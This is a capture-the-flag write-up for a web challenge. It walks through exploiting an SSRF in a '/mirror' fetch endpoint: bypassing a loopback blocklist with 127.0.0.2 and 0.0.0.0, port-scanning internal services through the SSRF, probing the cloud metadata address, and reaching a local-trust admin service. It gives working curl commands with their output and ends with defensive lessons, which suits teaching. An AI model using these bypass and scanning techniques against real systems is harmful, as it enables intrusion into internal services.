# Kepler's Office 2/5 — Reel Mirror

**Flag:** `reentry{ssrf_p1v0t_t0_th3_l00pb4ck_4dm1n}`
**Recovered on the way:** engineer scope token `ENG-7c1f9a4d` (needed in stage 3)

| | |
|---|---|
| Category | Web / SSRF + anti-SSRF filter bypass |
| Target | the office terminal instance (offline now) |
| Prereq | a logged-in operator session from stage 1 (`kepler:stardust`) |
| Files | none |

> **Challenge brief:** Signed in as an operator, the console can sync a reel from another MERIDIAN
> archive node — give it the node's URL and the terminal fetches the reel for you. Have a look
> around from where the terminal sits.

---

## Short version

1. The console has `/mirror` (POST `url`) — the server **fetches** the URL = **SSRF**.
2. The anti-SSRF filter requires an IP (no hostnames) and blocks loopback — but only exactly
   `127.0.0.1`/`::1`.
3. Bypass: `http://127.0.0.2/` and `http://0.0.0.0/` hit the loopback interface past the filter.
4. SSRF port scan → an internal node at **`127.0.0.1:1977`** (revealed in the mirror's message).
5. `http://0.0.0.0:1977/` → an internal "loopback admin" that trusts local calls and returns the
   flag (plus the engineer token for stage 3).

---

## 1. Find the SSRF

After login, `/console` links to `/mirror` (POST `url`, placeholder `http://host/reel.dat`).

## 2. Map the anti-SSRF filter

```bash
mir(){ curl -sk "$B/mirror" -b jar.txt --data-urlencode "url=$1" | sed 's/<[^>]*>//g' | grep -iE 'refused|fetched|failed|reentry'; }
mir "http://127.0.0.1/"   # refused: loopback addresses are not allowed
mir "http://localhost/"   # refused: loopback addresses are not allowed
mir "http://example.com/" # refused: reel node must be an IP address, not a hostname
```

Two rules: must be an IP, and not loopback.

## 3. Bypass the loopback filter

The filter only blocks literal `127.0.0.1`/`::1`, but the whole `127.0.0.0/8` range and `0.0.0.0`
are also loopback on Linux:

```bash
mir "http://127.0.0.2/"   # PASSES (reaches services bound to 0.0.0.0)
mir "http://0.0.0.0/"     # PASSES (reaches services bound only to 127.0.0.1)
```

## 4. Port scan via SSRF

```bash
for p in 80 443 5000 8000 8080 3000 9000 1977; do printf "port %s: " "$p"; mir "http://127.0.0.2:$p/"; echo; done
# port 8000 -> fetched: <!doctype html> ...  (the app's gunicorn)
mir "http://169.254.169.254/"
# fetched: ... synced MERIDIAN node ... to local archive node 127.0.0.1:1977
```

Target: **`127.0.0.1:1977`** (the 1977 theme).

## 5. Pivot to the loopback admin (port 1977)

Port 1977 binds only to 127.0.0.1, so `127.0.0.2` fails and `0.0.0.0` hits it:

```bash
curl -sk "$B/mirror" -b jar.txt --data-urlencode "url=http://0.0.0.0:1977/" | sed 's/<[^>]*>//g' | grep -iE 'reentry|token|trusted'
```

```
caller trusted as local.
engineer enrollment:
  operator clearance flag : reentry{ssrf_p1v0t_t0_th3_l00pb4ck_4dm1n}
  engineer scope token    : ENG-7c1f9a4d
note (K., private): the artifact is on the desk. a pendrive, 1977 data. do NOT connect it to the station bus.
```

🚩 **Flag:** `reentry{ssrf_p1v0t_t0_th3_l00pb4ck_4dm1n}`

Loot for later: **engineer scope token `ENG-7c1f9a4d`** (unlocks `/diag` in stage 3).

> **Note:** The instance is offline now, so this cannot be re-run; the chain and the engineer token
> are consistent with stage 3.

---

## Why it works / lessons

- Blocklisting IP representations does not work. `127.0.0.0/8` (except `.1`), `0.0.0.0`, decimal/hex/octal
  forms, and IPv6-mapped addresses are all loopback/aliases. Resolve the name to an IP and reject
  the **whole** private/loopback/link-local range (allowlist, not blocklist).
- A service that "trusts local callers" is ripe for SSRF abuse — trusting `remote_addr ==
  127.0.0.1` fails when another process on the host fetches a URL for the attacker.

> **Previous:** [1 - Operator Console](1%20-%20Operator%20Console.md) · **Next:** [3 - Diagnostics Report](3%20-%20Diagnostics%20Report.md)
